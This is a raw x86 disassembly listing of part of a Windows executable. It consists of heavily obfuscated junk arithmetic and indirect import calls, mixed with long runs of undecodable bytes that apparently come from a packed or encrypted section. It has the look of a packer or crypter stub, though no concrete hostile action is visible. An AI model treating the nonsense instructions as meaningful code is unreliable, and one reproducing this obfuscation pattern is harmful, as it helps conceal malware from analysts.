  401875:	mov    eax,DWORD PTR [eax]
  401877:	xor    edx,edi
  401879:	add    eax,DWORD PTR [ecx]
  40187b:	mov    edi,0x32de6d5d
  401880:	mov    ecx,DWORD PTR ds:0x428451
  401886:	sbb    DWORD PTR ds:0x4283fd,ecx
  40188c:	mov    DWORD PTR [ebp-0x14],eax
  40188f:	cmp    DWORD PTR ds:0x428559,0x0
  401896:	not    ecx
  401898:	mov    DWORD PTR ds:0x428469,0x2a4e
  4018a2:	mov    edx,DWORD PTR ds:0x42853d
  4018a8:	jmp    0x401900
  4018ad:	mov    DWORD PTR ds:0x428329,0x4cb6
  4018b7:	mov    eax,0x4273
  4018bc:	cmp    DWORD PTR ds:0x428559,0x0
  4018c3:	jle    0x4018e8
  4018c9:	push   DWORD PTR [ebp-0x14]
  4018cc:	push   0x428155
  4018d1:	push   0x4281e1
  4018d6:	call   DWORD PTR ds:0x42e22c
  4018dc:	add    ecx,edx
  4018de:	or     DWORD PTR ds:0x428441,0x428461
  4018e8:	and    ecx,0x1796
  4018ee:	sub    edx,0x208e
  4018f4:	xor    DWORD PTR ds:0x428455,edx
  4018fa:	sub    DWORD PTR ds:0x42845d,ebx
  401900:	mov    eax,DWORD PTR [ebp+0x18]
  401903:	mov    ecx,DWORD PTR [ebp+0x1c]
  401906:	cmp    DWORD PTR ds:0x428409,0x0
  40190d:	movzx  edx,BYTE PTR ds:0x428405
  401914:	mov    edx,DWORD PTR ds:0x4284e1
  40191a:	movzx  edx,WORD PTR ds:0x428569
  401921:	jmp    0x401971
  401926:	mov    DWORD PTR ds:0x428555,0x405c
  401930:	cmp    DWORD PTR ds:0x428409,0x0
  401937:	jge    0x401961
  40193d:	push   DWORD PTR [ebp-0xc]
  401940:	push   DWORD PTR [ebp-0x14]
  401943:	push   0x1391
  401948:	push   0x7a4e
  40194d:	call   DWORD PTR ds:0x42e0a0
  401953:	neg    edx
  401955:	add    edx,0x51c2
  40195b:	sbb    edx,DWORD PTR ds:0x428355
  401961:	adc    DWORD PTR ds:0x428551,ecx
  401967:	sub    DWORD PTR ds:0x428355,0x3064
  401971:	shrd   eax,ecx,0x2
  401975:	shr    ecx,0x2
  401978:	cmp    DWORD PTR ds:0x428465,0x0
  40197f:	mov    ecx,DWORD PTR ds:0x42843d
  401985:	mov    ecx,0x3508
  40198a:	not    edx
  40198c:	jmp    0x4019d4
  401991:	mov    DWORD PTR ds:0x428545,edi
  401997:	mov    DWORD PTR ds:0x428429,0x1955
  4019a1:	cmp    DWORD PTR ds:0x428465,0x0
  4019a8:	je     0x4019cc
  4019ae:	push   0x428233
  4019b3:	push   0x400000
  4019b8:	call   DWORD PTR ds:0x42e0a4
  4019be:	neg    edx
  4019c0:	xor    DWORD PTR ds:0x428331,0x55e7
  4019ca:	sub    ecx,ecx
  4019cc:	not    ecx
  4019ce:	and    ecx,DWORD PTR ds:0x428431
  4019d4:	mov    ecx,DWORD PTR [ebp+0x18]
  4019d7:	mov    edx,DWORD PTR [ebp+0x1c]
  4019da:	add    DWORD PTR ds:0x4284cd,0x428559
  4019e4:	xor    eax,edi
  4019e6:	xor    edx,edx
  4019e8:	or     edx,eax
  4019ea:	and    eax,0x837
  4019ef:	mov    DWORD PTR [ebp-0x3c],edx
  4019f2:	jmp    0x401d93
  4019f7:	inc    DWORD PTR [edx+0x3c]
  4019fa:	pop    ebx
  4019fb:	mov    esp,0xf09aa0bb
  401a00:	fisubr DWORD PTR [edx-0x2407e21d]
  401a06:	jecxz  0x4019c6
  401a08:	int3   
  401a09:	mov    esi,0xbec4bdbe
  401a0e:	mov    esi,0x942d9495
  401a13:	rol    DWORD PTR [edx+eax*8],0x90
  401a17:	xor    eax,0x5bca8209
  401a1c:	mov    bl,0x76
  401a1e:	outs   dx,BYTE PTR ds:[esi]
  401a1f:	sub    eax,DWORD PTR [edx+0x10f026fe]
  401a25:	push   esi
  401a26:	mov    al,ds:0xe63753a3
  401a2b:	lock mov ds:0x83e2e61b,al
  401a31:	daa    
  401a32:	and    DWORD PTR [eax],edi
  401a34:	outs   dx,BYTE PTR ds:[esi]
  401a35:	pop    ebx
  401a36:	es lahf 
  401a38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a39:	rcr    DWORD PTR [ecx-0x60],cl
  401a3c:	sub    DWORD PTR [ecx],eax
  401a3e:	jle    0x4019ca
  401a40:	push   cs
  401a41:	jl     0x401a23
  401a43:	xchg   ebp,eax
  401a44:	sub    ebx,eax
  401a46:	mov    ds:0xcf3ce695,eax
  401a4b:	neg    BYTE PTR ds:0x26fbdcba
  401a51:	push   0xffffff92
  401a53:	(bad)  
  401a54:	adc    esi,DWORD PTR [ebx]
  401a56:	dec    eax
  401a57:	popa   
  401a58:	cs pop edx
  401a5a:	pop    ds
  401a5b:	xor    dh,ah
  401a5d:	xchg   edi,eax
  401a5e:	dec    ebp
  401a5f:	clc    
  401a60:	push   edx
  401a61:	(bad)  
  401a63:	(bad)  
  401a64:	(bad)  
  401a65:	neg    dh
  401a67:	ret    0x274e
  401a6a:	in     al,dx
  401a6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a6c:	cwde   
  401a6d:	fbld   TBYTE PTR [ebx]
  401a6f:	push   ds
  401a70:	je     0x401a7c
  401a72:	add    esp,0x1a
  401a75:	or     dl,ah
  401a77:	cdq    
  401a78:	dec    esp
  401a79:	int3   
  401a7a:	push   0x53
  401a7c:	shl    bh,cl
  401a7e:	adc    DWORD PTR [esi+edi*4+0x775addc8],ebx
  401a85:	scas   al,BYTE PTR es:[edi]
  401a86:	xor    DWORD PTR [eax-0x64d8e192],esp
  401a8c:	js     0x401aea
  401a8e:	das    
  401a8f:	pop    ecx
  401a90:	aad    0xfa
  401a92:	lods   al,BYTE PTR cs:[esi]
  401a94:	push   edi
  401a95:	adc    BYTE PTR [eax-0x5],ch
  401a98:	div    BYTE PTR [ecx+edi*4]
  401a9b:	xchg   ebx,eax
  401a9c:	and    bh,ah
  401a9e:	cld    
  401a9f:	pusha  
  401aa0:	sbb    cl,BYTE PTR [ebp-0xc157ea0]
  401aa6:	es sbb eax,ebp
  401aa9:	push   ss
  401aaa:	pop    ebx
  401aab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401aac:	sub    eax,0x186e12cb
  401ab1:	cmp    al,0x3d
  401ab3:	in     eax,0x2b
  401ab5:	mov    edx,0xee24952a
  401aba:	cdq    
  401abb:	(bad)  
  401abc:	mov    al,ds:0x992f0acb
  401ac1:	sbb    eax,0xe866a1b1
  401ac6:	sub    bh,BYTE PTR [edx-0x52c4168b]
  401acc:	stc    
  401acd:	lahf   
  401ace:	test   BYTE PTR es:[edi-0xe48071b],bl
  401ad5:	mov    DWORD PTR [ebx-0x97624e1],esi
  401adb:	repz and bl,BYTE PTR [eax-0x2c083062]
  401ae2:	das    
  401ae3:	arpl   WORD PTR [ebx],dx
  401ae5:	loopne 0x401b08
  401ae7:	jnp    0x401b0a
  401ae9:	aad    0x42
  401aeb:	mov    ebx,DWORD PTR [edx]
  401aed:	dec    esp
  401aee:	jmp    0x14c2:0xe08aac67
  401af5:	dec    esp
  401af6:	retf   
  401af7:	xor    al,0x45
  401af9:	arpl   WORD PTR [edx-0x52],ax
  401afc:	sub    ebp,esi
  401afe:	push   ecx
  401aff:	pushf  
  401b00:	fld    DWORD PTR [edi+0x4a90adf9]
  401b06:	loopne 0x401ad8
  401b08:	adc    bh,BYTE PTR [ebx+0x5d]
  401b0b:	or     al,bl
  401b0d:	mov    al,ds:0x1b50c91
  401b12:	xchg   esp,eax
  401b13:	scas   eax,DWORD PTR es:[di]
  401b15:	outs   dx,BYTE PTR ds:[esi]
  401b16:	pop    ebp
  401b17:	cmp    ebp,esp
  401b19:	cmp    DWORD PTR [esi+ecx*1],esp
  401b1c:	(bad)  
  401b1d:	daa    
  401b1e:	fistp  DWORD PTR [esi+0x44]
  401b21:	int    0x2b
  401b23:	sbb    cl,BYTE PTR [eax+ecx*2]
  401b26:	push   cs
  401b27:	test   esp,ebx
  401b29:	cmp    dh,BYTE PTR [edx+0x3b7bb81d]
  401b2f:	icebp  
  401b30:	pop    edx
  401b31:	sbb    BYTE PTR [ecx],cl
  401b33:	xchg   BYTE PTR [edx+edx*4],al
  401b36:	repnz shl DWORD PTR [ebx],cl
  401b39:	popa   
  401b3a:	push   ds
  401b3b:	add    al,0xd1
  401b3d:	jecxz  0x401ae1
  401b3f:	test   eax,0x732adee2
  401b44:	sbb    BYTE PTR [edx-0x70c4f1ed],bh
  401b4a:	mov    edi,0xec19e556
  401b4f:	inc    ebx
  401b50:	cmp    al,0x31
  401b52:	lea    esp,[edx-0x17]
  401b55:	ins    DWORD PTR es:[edi],dx
  401b56:	ins    BYTE PTR es:[edi],dx
  401b57:	ret    
  401b58:	fwait
  401b59:	cs cli 
  401b5b:	xor    eax,0x23ec13cf
  401b60:	xor    al,al
  401b62:	dec    esp
  401b63:	xchg   ecx,eax
  401b64:	push   cs
  401b65:	aam    0xf
  401b67:	mov    ebx,0xb19424a2
  401b6c:	cmc    
  401b6d:	dec    ecx
  401b6e:	idiv   ebp
  401b70:	add    eax,0xefef22f8
  401b75:	and    BYTE PTR [ecx+eiz*4+0x61],dl
  401b79:	and    eax,DWORD PTR [edx+0x51]
  401b7c:	push   ebx
  401b7d:	jp     0x401be8
  401b7f:	mov    bl,0x5
  401b81:	adc    ecx,DWORD PTR [eax-0x4c]
  401b84:	inc    edi
  401b85:	test   al,0x8a
  401b87:	mov    eax,ds:0x8b0bf3e5
  401b8c:	dec    eax
  401b8d:	sub    eax,0x66c6db6a
  401b92:	jmp    0x5c32d090
  401b97:	sahf   
  401b98:	stos   BYTE PTR es:[edi],al
  401b99:	aaa    
  401b9a:	inc    edx
  401b9b:	out    dx,al
  401b9c:	lock xor BYTE PTR ds:[edi+0x20],ah
  401ba1:	dec    ebx
  401ba2:	inc    eax
  401ba3:	and    DWORD PTR [ecx-0x7369489d],0xffffffd6
  401baa:	out    dx,eax
  401bab:	mov    ?,edx
  401bad:	shl    esi,0xeb
  401bb0:	jmp    0xd439f036
  401bb5:	dec    esp
  401bb6:	aaa    
  401bb7:	(bad)  
  401bb8:	loop   0x401b58
  401bba:	jmp    0x8320:0xe93c8aa9
  401bc1:	pop    esi
  401bc2:	add    BYTE PTR [ecx],cl
  401bc4:	cmp    al,0xee
  401bc6:	pop    ss
  401bc7:	pop    ebx
  401bc8:	pop    eax
  401bc9:	push   ss
  401bca:	cmp    bl,BYTE PTR [ecx-0x479f1542]
  401bd0:	jmp    0xf681:0x578ad0d2
  401bd7:	mov    ebx,0x6993578
  401bdc:	mov    dl,0xce
  401bde:	ret    
  401bdf:	cmc    
  401be0:	out    dx,eax
  401be1:	sar    DWORD PTR [edx-0x1],0x67
  401be5:	mov    al,ds:0x7c45bf39
  401bea:	mov    bl,0xac
  401bec:	das    
  401bed:	enter  0xded0,0x52
  401bf1:	or     DWORD PTR [ebp+edx*2+0x20],ecx
  401bf5:	push   ebx
  401bf6:	test   BYTE PTR [edx],bh
  401bf8:	mov    bh,0x31
  401bfa:	into   
  401bfb:	jno    0x401bf5
  401bfd:	xor    BYTE PTR [ebx+0x18],dl
  401c00:	gs or  al,0xb2
  401c03:	fmul   DWORD PTR [edx-0x152a2a0]
  401c09:	mov    ds:0xf4ab9b9,al
  401c0e:	shl    cl,0x9b
  401c11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c12:	jne    0x401c5e
  401c14:	jne    0x401c90
  401c16:	mov    cs,WORD PTR [ebx+0x6caf67ec]
  401c1c:	pop    eax
  401c1d:	lock fidivr DWORD PTR [edx]
  401c20:	aad    0x18
  401c22:	lock fistp DWORD PTR [esi-0x5c750bac]
  401c29:	fadd   QWORD PTR [esi]
  401c2b:	enter  0x4150,0x74
  401c2f:	in     eax,0xc6
  401c31:	xchg   ebp,eax
  401c32:	sbb    dh,ah
  401c34:	xchg   ecx,eax
  401c35:	ds add eax,0x14248689
  401c3b:	push   ds
  401c3c:	mov    edi,0x6fa152b1
  401c41:	fisub  WORD PTR [edi+0x3b56037c]
  401c47:	into   
  401c48:	loopne 0x401bfb
  401c4a:	sub    eax,0xd4f29106
  401c4f:	cwde   
  401c50:	push   esp
  401c51:	fbstp  TBYTE PTR [esi]
  401c53:	mov    DWORD PTR [esi+edi*2],ebp
  401c56:	push   edi
  401c57:	retf   0x4c9
  401c5a:	mov    WORD PTR [edi],es
  401c5c:	cmp    al,0x73
  401c5e:	mov    ecx,0xbf3ce254
  401c63:	addr16 xor ecx,0xc0f7fab9
  401c6a:	outs   dx,BYTE PTR ds:[si]
  401c6c:	mov    dl,0x14
  401c6e:	imul   ebx,DWORD PTR [eax+0x1d271869],0x57c8fef1
  401c78:	(bad)  
  401c79:	mov    esp,0xd6a6533f
  401c7e:	cmp    DWORD PTR [ecx],esi
  401c80:	les    ecx,FWORD PTR [edx-0x2a1ad26c]
  401c86:	fdivr  DWORD PTR [esi-0xef765ea]
  401c8c:	or     BYTE PTR [ebp+eiz*2-0x40],cl
  401c90:	or     BYTE PTR [ecx-0x715c7659],dl
  401c96:	jl     0x401c3b
  401c98:	mov    esi,0x916e8c9e
  401c9d:	jg     0x401cbe
  401c9f:	xor    ebp,eax
  401ca1:	sub    DWORD PTR [esi-0x9],ebp
  401ca4:	rol    BYTE PTR [ecx],1
  401ca6:	and    bh,BYTE PTR [esi+0x5c]
  401ca9:	xchg   ecx,ebx
  401cab:	or     eax,0x5c01c80a
  401cb0:	jge    0x401c5d
  401cb2:	ins    DWORD PTR es:[edi],dx
  401cb3:	inc    ebx
  401cb4:	push   0xe236f731
  401cb9:	test   eax,0x22b48219
  401cbe:	dec    edx
  401cbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cc0:	inc    ebp
  401cc1:	and    bl,BYTE PTR [ebx-0x12]
  401cc4:	sub    al,0xf3
  401cc6:	xor    DWORD PTR [ecx],edi
  401cc8:	int    0x84
  401cca:	out    dx,eax
  401ccb:	inc    ebp
  401ccc:	fisubr DWORD PTR [edx+0x1a]
  401ccf:	jne    0x401cfc
  401cd1:	xchg   edi,eax
  401cd2:	push   si
  401cd4:	pop    ebp
  401cd5:	pusha  
  401cd6:	arpl   WORD PTR [edx],cx
  401cd8:	in     eax,dx
  401cd9:	inc    esp
  401cda:	or     al,0x9b
  401cdc:	pop    ss
  401cdd:	jbe    0x401d27
  401cdf:	cwde   
  401ce0:	mov    ecx,0xed896e2b
  401ce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ce6:	pop    es
  401ce7:	je     0x401d50
  401ce9:	test   ch,dh
  401ceb:	inc    edi
  401cec:	scas   eax,DWORD PTR es:[edi]
  401ced:	arpl   WORD PTR [ecx],bx
  401cef:	loopne 0x401c8d
  401cf1:	out    dx,eax
  401cf2:	cmp    eax,0xc74a4348
  401cf7:	popf   
  401cf8:	fsubr  DWORD PTR [edi]
  401cfa:	xor    edx,DWORD PTR [esi+edi*1-0x1e50648d]
  401d01:	mov    ch,0x4e
  401d03:	pushf  
  401d04:	sahf   
  401d05:	rol    BYTE PTR [ebx+esi*2+0xd],1
  401d09:	push   ds
  401d0a:	repnz fisubr DWORD PTR fs:[eax+0x70471ba4]
  401d12:	call   0x8e56c201
  401d17:	cmp    al,0xbb
  401d19:	jmp    0x401d2d
  401d1b:	fs pop ds
  401d1d:	xchg   ebx,eax
  401d1e:	test   eax,0x5cf00856
  401d23:	jecxz  0x401d07
  401d25:	fsubr  QWORD PTR [esi-0x2]
  401d28:	stos   DWORD PTR es:[edi],eax
  401d29:	aam    0xea
  401d2b:	ins    BYTE PTR es:[edi],dx
  401d2c:	push   ebx
  401d2d:	fadd   QWORD PTR [edx+esi*2-0x79]
  401d31:	mov    ecx,DWORD PTR [esi-0x1b265051]
  401d37:	lock mov cs,WORD PTR [edi]
  401d3a:	mov    ecx,0xdc0db230
  401d3f:	mov    cl,BYTE PTR [edi-0x1582a76d]
  401d45:	add    bh,cl
  401d47:	xlat   BYTE PTR ds:[bx]
  401d49:	sbb    ebp,ebp
  401d4b:	mov    edi,0xecf5af38
  401d50:	ret    
  401d51:	ja     0x401d33
  401d53:	dec    ebp
  401d54:	xchg   ch,ah
  401d56:	inc    edi
  401d57:	dec    eax
  401d58:	fdivr  st,st(6)
  401d5a:	lahf   
  401d5b:	cmpps  xmm7,XMMWORD PTR ds:[edx-0x5f14609],0xcd
  401d64:	sar    ebp,cl
  401d66:	out    dx,eax
  401d67:	in     al,0x49
  401d69:	lds    edx,FWORD PTR [ecx+eax*1-0x69]
  401d6d:	adc    edi,DWORD PTR [edi]
  401d6f:	mov    edx,0xe49005dd
  401d74:	(bad)  
  401d75:	push   edx
  401d76:	adc    dl,cl
  401d78:	jge    0x401d93
  401d7a:	or     BYTE PTR [edi],al
  401d7c:	clc    
  401d7d:	shl    BYTE PTR [ecx+0x344eec62],cl
  401d83:	mov    esp,0x79c9be08
  401d88:	adc    al,0xae
  401d8a:	out    dx,al
  401d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d8c:	stos   DWORD PTR es:[edi],eax
  401d8d:	sub    ah,cl
  401d8f:	cmp    ch,BYTE PTR [ebp-0x6f]
  401d92:	rol    bh,1
  401d94:	inc    ebp
  401d95:	nop
  401d96:	push   ebp
  401d97:	sub    al,0x0
  401d99:	add    bh,al
  401d9b:	inc    ebp
  401d9c:	xchg   esp,eax
  401d9d:	outs   dx,DWORD PTR ds:[esi]
  401d9e:	inc    ebp
  401d9f:	add    BYTE PTR [eax],al
  401da1:	mov    DWORD PTR [ebp-0x70],0x78a6
  401da8:	mov    DWORD PTR [ebp-0x6c],0x188
  401daf:	sbb    DWORD PTR ds:0x428415,ecx
  401db5:	mov    DWORD PTR [ebp-0x70],0x5b3f
  401dbc:	mov    DWORD PTR [ebp-0x6c],0x3219
  401dc3:	add    DWORD PTR ds:0x42854d,0x3158
  401dcd:	mov    DWORD PTR [ebp-0x70],0x231c
  401dd4:	add    eax,DWORD PTR ds:0x4283fd
  401dda:	mov    DWORD PTR [ebp-0x6c],0x1337
  401de1:	sub    DWORD PTR ds:0x428361,edx
  401de7:	mov    DWORD PTR [ebp-0x70],0x7593
  401dee:	mov    DWORD PTR [ebp-0x6c],0x11b8
  401df5:	movzx  eax,BYTE PTR ds:0x42833d
  401dfc:	and    DWORD PTR ds:0x428565,eax
  401e02:	mov    DWORD PTR [ebp-0x70],0x3b72
  401e09:	mov    DWORD PTR [ebp-0x6c],0x3abc
  401e10:	cmp    DWORD PTR ds:0x428405,0x0
  401e17:	mov    DWORD PTR ds:0x42853d,0x646
  401e21:	mov    DWORD PTR ds:0x428415,0x14a3
  401e2b:	jmp    0x401eb8
  401e30:	movzx  eax,WORD PTR ds:0x4284e1
  401e37:	mov    DWORD PTR ds:0x428405,ebx
  401e3d:	cmp    DWORD PTR ds:0x428405,0x0
  401e44:	jle    0x401e86
  401e4a:	push   DWORD PTR [ebp-0x20]
  401e4d:	push   0x428233
  401e52:	push   0x428137
  401e57:	push   0x400000
  401e5c:	call   DWORD PTR ds:0x42e230
  401e62:	xor    DWORD PTR ds:0x42853d,0x4536
  401e6c:	sub    DWORD PTR ds:0x4284c5,edi
  401e72:	sbb    DWORD PTR ds:0x42842d,0x42853d
  401e7c:	add    DWORD PTR ds:0x428455,0x5ddd
  401e86:	sbb    DWORD PTR ds:0x428565,0x428415
  401e90:	adc    DWORD PTR ds:0x428559,0x5ea9
  401e9a:	sub    DWORD PTR ds:0x428549,0x428535
  401ea4:	add    DWORD PTR ds:0x428335,0x5dac
  401eae:	add    DWORD PTR ds:0x42832d,0x46fc
  401eb8:	mov    DWORD PTR [ebp-0x68],0x1b45
  401ebf:	xor    DWORD PTR ds:0x428421,edx
  401ec5:	mov    DWORD PTR [ebp-0x64],0x767d
  401ecc:	or     DWORD PTR ds:0x42853d,edi
  401ed2:	mov    DWORD PTR [ebp-0x60],0x1d973857
  401ed9:	mov    DWORD PTR [ebp-0x5c],0x0
  401ee0:	mov    DWORD PTR [ebp-0x34],0x599d
  401ee7:	xor    eax,DWORD PTR ds:0x4284b5
  401eed:	mov    DWORD PTR [ebp-0x2c],0x165d
  401ef4:	mov    DWORD PTR [ebp-0x1c],0xc51
  401efb:	xor    eax,eax
  401efd:	add    eax,DWORD PTR ds:0x428349
  401f03:	or     eax,DWORD PTR ds:0x428425
  401f09:	mov    ds:0x428349,eax
  401f0e:	mov    DWORD PTR [ebp-0x44],0x3f55
  401f15:	cmp    DWORD PTR ds:0x42854d,0x0
  401f1c:	mov    DWORD PTR ds:0x428325,0xd43
  401f26:	mov    DWORD PTR ds:0x428569,0x5a6d
  401f30:	mov    DWORD PTR ds:0x42840d,edx
  401f36:	jmp    0x40200c
  401f3b:	mov    eax,0x36f8
  401f40:	mov    DWORD PTR ds:0x428465,edx
  401f46:	cmp    DWORD PTR ds:0x42854d,0x0
  401f4d:	jg     0x401f82
  401f53:	push   0x4521
  401f58:	push   0x4861
  401f5d:	push   DWORD PTR [ebp-0x20]
  401f60:	push   0x428228
  401f65:	push   DWORD PTR [ebp-0x28]
  401f68:	call   DWORD PTR ds:0x42e0a8
  401f6e:	adc    DWORD PTR ds:0x428435,0x7cd6
  401f78:	sbb    DWORD PTR ds:0x4284e1,0xfa0
  401f82:	adc    DWORD PTR ds:0x428441,0x42832d
  401f8c:	add    DWORD PTR ds:0x428349,0x428461
  401f96:	cmp    DWORD PTR ds:0x42853d,0x0
  401f9d:	mov    DWORD PTR ds:0x428465,0x6252
  401fa7:	mov    DWORD PTR ds:0x428361,0x40d0
  401fb1:	jmp    0x40200c
  401fb6:	mov    DWORD PTR ds:0x428545,edx
  401fbc:	cmp    DWORD PTR ds:0x42853d,0x0
  401fc3:	ja     0x401fee
  401fc9:	push   0x428155
  401fce:	call   DWORD PTR ds:0x42e234
  401fd4:	and    DWORD PTR ds:0x42834d,0x4284e9
  401fde:	sbb    DWORD PTR ds:0x428429,0x5068
  401fe8:	xor    DWORD PTR ds:0x4284e1,edi
  401fee:	and    DWORD PTR ds:0x4284d1,0x42856d
  401ff8:	xor    DWORD PTR ds:0x4284e9,0x428565
  402002:	add    DWORD PTR ds:0x428535,0xd3c
  40200c:	mov    DWORD PTR [ebp-0x44],0x1
  402013:	mov    DWORD PTR [ebp-0x44],0x42e8
  40201a:	mov    eax,DWORD PTR [ebp-0x60]
  40201d:	add    DWORD PTR ds:0x428345,0x4284bd
  402027:	shl    ecx,0x1e
  40202a:	mov    ecx,DWORD PTR [ebp-0x5c]
  40202d:	add    DWORD PTR ds:0x4284c5,0x5f4
  402037:	push   ecx
  402038:	adc    DWORD PTR ds:0x4284ed,0x428339
  402042:	push   eax
  402043:	or     DWORD PTR ds:0x4284f1,0x4284cd
  40204d:	push   0xddf
  402052:	sbb    DWORD PTR ds:0x428351,0x218d
  40205c:	jmp    0x4023fd
  402061:	mov    ebp,0x2b7a2504
  402066:	jl     0x401ffa
  402068:	mov    esp,0x9e22191a
  40206d:	cmp    eax,0xbde3d91e
  402072:	sar    BYTE PTR [esi-0x413b4242],cl
  402078:	mov    esi,0x94357916
  40207d:	lahf   
  40207e:	push   edx
  40207f:	add    eax,0x4d9c0435
  402084:	lods   al,BYTE PTR ds:[esi]
  402085:	dec    ecx
  402086:	sub    DWORD PTR [ebx-0x7d383c94],edi
  40208c:	or     DWORD PTR [edi+0x404b3102],ecx
  402092:	lods   eax,DWORD PTR ds:[esi]
  402093:	clc    
  402094:	and    al,0x3
  402096:	inc    ebx
  402097:	jmp    FWORD PTR [ecx]
  402099:	and    eax,0x520a3be5
  40209e:	mov    bh,0x2d
  4020a0:	sbb    ch,cl
  4020a2:	gs inc ebx
  4020a4:	cmp    BYTE PTR [ebx-0x5c8b271f],bh
  4020aa:	xor    eax,0x2fa02fc3
  4020af:	lock xchg ecx,eax
  4020b1:	jp     0x4020c6
  4020b3:	das    
  4020b4:	push   esp
  4020b5:	push   es
  4020b6:	cdq    
  4020b7:	mov    ch,0x33
  4020b9:	pop    ebx
  4020ba:	icebp  
  4020bb:	fld    QWORD PTR [ebx]
  4020bd:	or     BYTE PTR [eax-0x76],dh
  4020c0:	or     eax,0x25e5abdf
  4020c5:	test   DWORD PTR [edx-0x3b3964a4],0x8d10d346
  4020cf:	or     BYTE PTR [ebx+ebp*4-0x4b8b2c21],dl
  4020d6:	jmp    0x402122
  4020d8:	add    DWORD PTR [ecx+esi*8+0x77b15581],ebx
  4020df:	sbb    BYTE PTR [eax+0x2d],ch
  4020e2:	mov    al,ds:0x66d0ceb4
  4020e7:	push   ds
  4020e8:	xchg   edi,eax
  4020e9:	pusha  
  4020ea:	add    DWORD PTR [eax],esi
  4020ec:	shr    ebp,1
  4020ee:	xor    DWORD PTR [ebx-0x45],ecx
  4020f1:	mov    edx,ds
  4020f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020f4:	test   DWORD PTR [edx],ebp
  4020f6:	std    
  4020f7:	inc    BYTE PTR [ebx+eax*8+0x1c]
  4020fb:	test   ah,dh
  4020fd:	mov    ch,0x47
  4020ff:	shr    DWORD PTR [edi+0x119f2d4d],1
  402105:	mov    al,ds:0x657be5ca
  40210a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40210b:	bnd jae 0x40215d
  40210e:	imul   ebp,DWORD PTR [eax+0x57f6e2e8],0x3776c6a5
  402118:	daa    
  402119:	fmul   DWORD PTR [ebp-0x28f66cab]
  40211f:	out    0x10,eax
  402121:	ss in  al,0xa4
  402124:	inc    ebp
  402125:	mov    gs,WORD PTR [edi-0xfaf8947]
  40212b:	out    0x1d,eax
  40212d:	xchg   ebx,eax
  40212e:	sub    bl,BYTE PTR [ebp+ecx*4+0x25]
  402132:	or     eax,0xed04bf14
  402137:	pop    ebp
  402138:	mov    edx,0x50819b14
  40213d:	inc    edi
  40213e:	gs sbb ah,0x10
  402142:	push   esi
  402143:	retf   
  402144:	aam    0xd
  402146:	add    BYTE PTR [esi],al
  402148:	mov    ebx,0x365f929e
  40214d:	sbb    eax,0x850e292f
  402152:	dec    esi
  402153:	sahf   
  402154:	mov    ch,0x67
  402156:	in     eax,dx
  402157:	outs   dx,DWORD PTR ds:[esi]
  402158:	inc    edx
  402159:	pusha  
  40215a:	in     al,0x46
  40215c:	push   edx
  40215d:	(bad)  
  40215e:	jmp    0x4021cd
  402160:	int3   
  402161:	(bad)  
  402162:	push   ss
  402163:	lahf   
  402164:	fwait
  402165:	retf   
  402166:	int    0x1d
  402168:	lds    esi,FWORD PTR [esi+0x7d]
  40216b:	arpl   WORD PTR [ecx],dx
  40216d:	sbb    cl,BYTE PTR [esi-0x60]
  402170:	clc    
  402171:	cmp    edi,esp
  402173:	int3   
  402174:	xchg   ebp,eax
  402175:	int    0xbb
  402177:	(bad)  
  402178:	pop    es
  402179:	xchg   esp,eax
  40217a:	or     DWORD PTR ds:0x4d2a2dfe,eax
  402180:	pusha  
  402181:	stos   DWORD PTR es:[edi],eax
  402182:	iret   
  402183:	jmp    0xf236:0x8d8b8a8
  40218a:	stc    
  40218b:	xchg   ebx,eax
  40218c:	adc    dl,BYTE PTR [ebp-0x223635dd]
  402192:	jbe    0x402171
  402194:	cmc    
  402195:	sbb    BYTE PTR [edi+0xb367810],dl
  40219b:	mov    ebp,0x15873f8a
  4021a0:	jmp    0x402145
  4021a2:	sub    ebx,ebx
  4021a4:	or     BYTE PTR [eax+0x4b],bh
  4021a7:	cdq    
  4021a8:	jl     0x4021b3
  4021aa:	nop
  4021ab:	cmp    eax,0x35c11e8f
  4021b0:	dec    edx
  4021b1:	retf   0xfe89
  4021b4:	mov    eax,0x2b2f2193
  4021b9:	sbb    ebx,edx
  4021bb:	scas   al,BYTE PTR es:[edi]
  4021bc:	jns    0x4021c6
  4021be:	jno    0x402234
  4021c0:	mov    ecx,0x849dea5e
  4021c5:	dec    ebp
  4021c6:	cwde   
  4021c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021c8:	clc    
  4021c9:	push   esi
  4021ca:	cmp    eax,0xd365fd0c
  4021cf:	in     eax,0x83
  4021d1:	icebp  
  4021d2:	push   ebp
  4021d3:	push   es
  4021d4:	mov    ah,0x5a
  4021d6:	out    dx,eax
  4021d7:	mov    ch,0x8e
  4021d9:	adc    al,0xf
  4021db:	sbb    eax,0xc2916cc3
  4021e0:	(bad)  
  4021e1:	std    
  4021e2:	jns    0x4021e7
  4021e4:	xchg   ecx,eax
  4021e5:	xchg   edx,eax
  4021e6:	push   es
  4021e7:	aad    0xb3
  4021e9:	mov    esi,DWORD PTR [esi]
  4021eb:	stc    
  4021ec:	scas   eax,DWORD PTR es:[edi]
  4021ed:	test   eax,0x23e68404
  4021f2:	fistp  WORD PTR [edi-0x1]
  4021f5:	pop    ebp
  4021f6:	pop    esi
  4021f7:	push   ds
  4021f8:	xor    ebx,DWORD PTR [esi+0x1bb2ef26]
  4021fe:	fiadd  DWORD PTR [esi]
  402200:	push   esp
  402201:	jmp    0x402248
  402203:	add    eax,edi
  402205:	pop    ebp
  402206:	pop    ss
  402207:	pusha  
  402208:	mov    al,ds:0x31f45fbf
  40220d:	pop    esi
  40220e:	les    ebp,FWORD PTR [ebp-0x7]
  402211:	xor    edx,ebp
  402213:	das    
  402214:	and    esi,DWORD PTR [ecx]
  402216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402217:	sub    DWORD PTR [edx],esp
  402219:	cmp    dl,dl
  40221b:	mov    ebp,0xf2c68c6f
  402220:	adc    dl,BYTE PTR [eax+ecx*8]
  402223:	adc    eax,0x44ae022
  402228:	imul   ebx,ecx,0x3e
